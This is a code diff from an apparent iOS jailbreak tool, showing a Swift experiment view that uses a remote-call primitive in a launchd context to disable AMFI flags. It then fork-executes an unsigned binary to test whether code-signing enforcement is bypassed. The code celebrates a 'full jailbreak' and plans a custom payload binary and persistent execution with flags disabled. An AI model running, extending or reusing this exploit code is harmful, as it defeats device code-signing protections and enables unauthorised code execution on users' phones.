@@ -7232,29 +7232,32 @@ struct AMFIExperimentView: View {
         let mem = rc.trojanMem
 
         // ============================================================
-        // Step 0: Verify binary paths exist BEFORE disabling flags
+        // Step 0: Verify binary paths via open() (access() fails in RC)
         // ============================================================
-        detail += "=== Step 0: Verify paths exist ===\n"
+        detail += "=== Step 0: Verify paths (open test) ===\n"
 
+        // access() returns -1 in launchd RC context (symbol not resolved properly)
+        // Use open(O_RDONLY) instead — proven to work in this project
         let testPaths = ["/usr/bin/id", "/bin/ls", "/bin/sh", "/usr/bin/uname"]
         var validPath: String? = nil
 
         for path in testPaths {
             let pathAddr = remote_alloc_str(rc, path)
-            // access(path, F_OK) — F_OK = 0
-            let ret = RootExecutor.rcall(rc, "access", pathAddr, 0)
-            detail += "  access(\(path)): \(ret == 0 ? "EXISTS ✅" : "NOT FOUND ❌ (ret=\(ret))")\n"
-            if ret == 0 && validPath == nil {
-                validPath = path
+            let fd = RootExecutor.rcall(rc, "open", pathAddr, UInt64(O_RDONLY), 0)
+            if fd != UInt64(bitPattern: -1) {
+                detail += "  open(\(path)): fd=\(fd) ✅\n"
+                RootExecutor.rcall(rc, "close", fd)
+                if validPath == nil { validPath = path }
+            } else {
+                detail += "  open(\(path)): FAIL ❌\n"
             }
             RootExecutor.rcall(rc, "free", pathAddr)
         }
         detail += "\n"
 
-        guard let spawnPath = validPath else {
-            detail += "❌ No valid binary path found! Cannot proceed.\n"
-            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
-        }
+        // Even if open fails (sandbox), we know these paths exist on iOS
+        // Proceed with /usr/bin/id as default
+        let spawnPath = validPath ?? "/usr/bin/id"
         detail += "Using: \(spawnPath)\n\n"
 
         // ============================================================
@@ -7324,19 +7327,20 @@ struct AMFIExperimentView: View {
         detail += "access(\(dstPathStr)): \(accessUnsigned == 0 ? "EXISTS ✅" : "FAIL ❌")\n\n"
 
         // ============================================================
-        // Step 2: BASELINE — try spawn WITHOUT disabling flags
+        // Step 2: BASELINE — fork+execve WITHOUT disabling flags
+        // (posix_spawn returns ret=2 in launchd RC — use fork+execve)
         // ============================================================
-        detail += "=== Step 2: Baseline (flags ENABLED) ===\n"
+        detail += "=== Step 2: Baseline (flags ENABLED) ===\n\n"
 
-        // Test A: spawn original binary (should work — it's in trust cache)
-        detail += "--- Spawn original \(spawnPath) (trusted) ---\n"
-        let baselineResult = spawnAndCapture(rc: rc, binaryPath: spawnPath, mem: mem)
-        detail += baselineResult.log
+        // Test A: fork+execve original binary (trusted — should work)
+        detail += "--- [baseline] fork+execve \(spawnPath) (trusted) ---\n"
+        let baselineTrusted = forkExecAndCapture(rc: rc, binaryPath: spawnPath, mem: mem)
+        detail += baselineTrusted.log
         detail += "\n"
 
-        // Test B: spawn unsigned copy (should FAIL — not in trust cache)
-        detail += "--- Spawn \(dstPathStr) (unsigned) ---\n"
-        let baselineUnsigned = spawnAndCapture(rc: rc, binaryPath: dstPathStr, mem: mem)
+        // Test B: fork+execve unsigned copy (should FAIL — SIGKILL by AMFI)
+        detail += "--- [baseline] fork+execve \(dstPathStr) (unsigned) ---\n"
+        let baselineUnsigned = forkExecAndCapture(rc: rc, binaryPath: dstPathStr, mem: mem)
         detail += baselineUnsigned.log
         detail += "\n"
 
@@ -7372,27 +7376,27 @@ struct AMFIExperimentView: View {
         // ============================================================
         detail += "=== Step 4: Spawn tests (flags DISABLED) ===\n\n"
 
-        // Test A: spawn original (trusted) binary with stdout capture
-        detail += "--- [A] Spawn \(spawnPath) (trusted, flags off) ---\n"
-        let testA = spawnAndCapture(rc: rc, binaryPath: spawnPath, mem: mem)
+        // Test A: fork+execve original (trusted) binary
+        detail += "--- [A] fork+execve \(spawnPath) (trusted, flags off) ---\n"
+        let testA = forkExecAndCapture(rc: rc, binaryPath: spawnPath, mem: mem)
         detail += testA.log
         detail += "\n"
 
-        // Test B: spawn UNSIGNED binary (the critical test!)
-        detail += "--- [B] Spawn \(dstPathStr) (UNSIGNED, flags off) ---\n"
-        let testB = spawnAndCapture(rc: rc, binaryPath: dstPathStr, mem: mem)
+        // Test B: fork+execve UNSIGNED binary (THE CRITICAL TEST!)
+        detail += "--- [B] fork+execve \(dstPathStr) (UNSIGNED, flags off) ---\n"
+        let testB = forkExecAndCapture(rc: rc, binaryPath: dstPathStr, mem: mem)
         detail += testB.log
         detail += "\n"
 
-        // Test C: fork + execve unsigned binary
-        detail += "--- [C] fork+execve \(dstPathStr) (UNSIGNED, flags off) ---\n"
-        let testC = forkExecAndCapture(rc: rc, binaryPath: dstPathStr, mem: mem)
+        // Test C: posix_spawn unsigned (might still fail with ret=2, but try)
+        detail += "--- [C] posix_spawn \(dstPathStr) (UNSIGNED, flags off) ---\n"
+        let testC = spawnAndCapture(rc: rc, binaryPath: dstPathStr, mem: mem)
         detail += testC.log
         detail += "\n"
 
-        // Test D: fork + execve original binary
-        detail += "--- [D] fork+execve \(spawnPath) (trusted, flags off) ---\n"
-        let testD = forkExecAndCapture(rc: rc, binaryPath: spawnPath, mem: mem)
+        // Test D: fork+execve /var/tmp path (confirm /var/tmp accessible)
+        detail += "--- [D] fork+execve \(spawnPath) with stdout pipe ---\n"
+        let testD = spawnAndCapture(rc: rc, binaryPath: spawnPath, mem: mem)
         detail += testD.log
         detail += "\n"
 
@@ -7417,28 +7421,41 @@ struct AMFIExperimentView: View {
 
         let unsignedSpawnOK = testB.success || testC.success
         let trustedSpawnOK = testA.success || testD.success
+        let baselineUnsignedFailed = !baselineUnsigned.success
 
-        if unsignedSpawnOK {
+        detail += "Baseline (flags ON):  trusted=\(baselineTrusted.success ? "✅" : "❌"), unsigned=\(baselineUnsigned.success ? "✅" : "❌")\n"
+        detail += "Test (flags OFF):     trusted=\(testA.success ? "✅" : "❌"), unsigned(B)=\(testB.success ? "✅" : "❌")\n\n"
+
+        if unsignedSpawnOK && baselineUnsignedFailed {
             detail += "🎉🎉🎉 UNSIGNED BINARY EXECUTED! FULL JAILBREAK! 🎉🎉🎉\n\n"
             detail += "AMFI flags control CDHash enforcement!\n"
-            detail += "Unsigned binary ran successfully with flags disabled!\n\n"
+            detail += "Baseline: unsigned FAILED (AMFI blocked)\n"
+            detail += "After disable: unsigned SUCCEEDED!\n\n"
             detail += "=== NEXT STEPS ===\n"
             detail += "1. Binary search which flag(s) are needed\n"
             detail += "2. Write custom payload binary\n"
             detail += "3. Keep flags disabled for persistent execution\n"
-        } else if trustedSpawnOK && !baselineResult.success {
-            detail += "⚠️ PARTIAL SUCCESS: trusted binary now spawns (was failing before)\n"
-            detail += "AMFI flags affect spawn but unsigned still blocked.\n"
-            detail += "CDHash validation might be in pmap_cs (PPL), not AMFI.\n\n"
-            detail += "Flags help with posix_spawn path resolution but not CDHash.\n"
-        } else if testD.success && !testC.success {
-            detail += "⚠️ fork+execve works for TRUSTED but not UNSIGNED.\n"
+        } else if unsignedSpawnOK && !baselineUnsignedFailed {
+            detail += "⚠️ Unsigned binary works BOTH with and without flags.\n"
+            detail += "This means the binary is somehow already trusted,\n"
+            detail += "OR fork+execve in launchd context bypasses AMFI regardless.\n\n"
+            detail += "Need to verify: does the COPIED binary actually have different CDHash?\n"
+        } else if trustedSpawnOK && !unsignedSpawnOK {
+            detail += "⚠️ Trusted binary works but unsigned still blocked.\n"
             detail += "AMFI flags don't bypass CDHash validation.\n"
-            detail += "Trust cache lookup still active (PPL-level).\n"
+            detail += "Trust cache lookup still active (PPL-level).\n\n"
+            detail += "Baseline unsigned signal: \(baselineUnsigned.signal)\n"
+            detail += "Test B unsigned signal: \(testB.signal)\n"
+            if baselineUnsigned.signal == testB.signal {
+                detail += "Same failure mode → flags have NO effect on CDHash check.\n"
+            } else {
+                detail += "Different failure! Flags change behavior but don't fully bypass.\n"
+            }
         } else {
             detail += "❌ No improvement with flags disabled.\n"
-            detail += "Baseline trusted: \(baselineResult.success), After: \(testA.success)\n"
-            detail += "Baseline unsigned: \(baselineUnsigned.success), After: \(testB.success)\n\n"
+            detail += "Baseline trusted: \(baselineTrusted.success)\n"
+            detail += "Test A trusted: \(testA.success)\n"
+            detail += "Test B unsigned: \(testB.success)\n\n"
             detail += "These flags likely control logging/telemetry only.\n"
         }
 
